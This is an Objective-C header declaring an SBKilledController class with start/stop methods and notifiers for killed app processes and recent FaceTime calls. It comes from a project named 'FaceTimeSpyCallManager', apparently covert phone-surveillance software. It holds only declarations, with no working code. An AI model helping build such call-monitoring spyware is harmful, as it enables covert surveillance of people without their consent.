//
//  SBKilledController.h
//  FaceTimeSpyCallManager
//
//  Created by Makara Khloth on 1/28/16.
//
//

#import <Foundation/Foundation.h>

@class AppProcessKilledNotifier, RecentFaceTimeCallNotifier;

@interface SBKilledController : NSObject {
    AppProcessKilledNotifier *mSBKilledNnotifier;
    RecentFaceTimeCallNotifier *mRecentFaceTimeCallNotifier;
}

@property (nonatomic, assign) RecentFaceTimeCallNotifier *mRecentFaceTimeCallNotifier;

- (void) start;
- (void) stop;

@end
